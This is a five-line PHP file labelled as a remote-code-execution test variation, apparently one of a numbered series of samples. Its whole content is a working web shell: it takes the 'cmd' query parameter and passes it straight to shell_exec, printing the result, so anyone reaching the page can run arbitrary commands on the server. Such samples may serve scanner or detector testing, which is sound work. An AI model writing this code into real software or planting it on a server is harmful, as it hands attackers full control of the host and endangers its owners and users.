<?php
// RCE test variation #1070
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>